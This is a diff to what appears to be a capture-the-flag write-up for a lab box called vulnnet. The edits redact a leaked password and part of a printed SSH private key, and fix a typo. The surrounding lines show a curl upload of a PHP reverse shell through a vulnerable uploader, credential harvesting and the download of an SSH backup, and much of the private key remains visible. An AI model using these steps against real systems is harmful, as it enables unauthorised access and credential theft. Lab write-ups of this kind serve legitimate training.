@@ -150,7 +150,7 @@ $ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
 LETS MODIFY THE CURL COMMAND AND TRY TO UPLOAD THE REVERSE SHELL:
 
 ┌──(kali㉿kali)-[~/vulnet]
-└─$ curl -u developers:9972761drmfsls -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
+└─$ curl -u developers:REDACED -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
 creating file{"success":"yes","file_name":"1616086897011d4d","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}  
 
 I THINK OUR FILE IS UPLOADED
@@ -196,7 +196,7 @@ www-data@vulnnet:/var/www/html/includes$ cat dbconnect.php
 
 
 	GOT SOME CREDS, LETS TRY THESE
-NOTHING IMP IN THE MYSQL SERVR
+NOTHING IMP IN THE MYSQL SERVER
 
 IN THE /var/backup FOLDER:
 www-data@vulnnet:/var/backups$ ls -la
@@ -208,7 +208,7 @@ www-data@vulnnet:/var/backups$ ls -la
 GOT THIS SSH BACKUP WHICH IS READABLE BY ANYONE, SO I DOWNLOAD THIS FILE TO MY LOCAL MACHINE:
 
 ┌──(kali㉿kali)-[~/vulnet]
-└─$ wget --user=developers --password=9972761drmfsls http://broadcast.vulnnet.thm:8000/ssh-backup.tar.gz                                                            2 ⨯
+└─$ wget --user=developers --password=REDACTED http://broadcast.vulnnet.thm:8000/ssh-backup.tar.gz                                                            2 ⨯
 --2021-03-18 13:49:56--  http://broadcast.vulnnet.thm:8000/ssh-backup.tar.gz
 Resolving broadcast.vulnnet.thm (broadcast.vulnnet.thm)... 10.10.75.240
 Connecting to broadcast.vulnnet.thm (broadcast.vulnnet.thm)|10.10.75.240|:8000... connected.
@@ -239,18 +239,7 @@ dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
 dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
 tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
 hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
-3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
-jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
-5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
-r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
-v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
-n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
-nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
-oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
-MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
-7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
-obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
-hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
+++++++++++++++++++REDACTED+++++++++++++++++++++++++++++++++++++
 ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
 wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
 GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
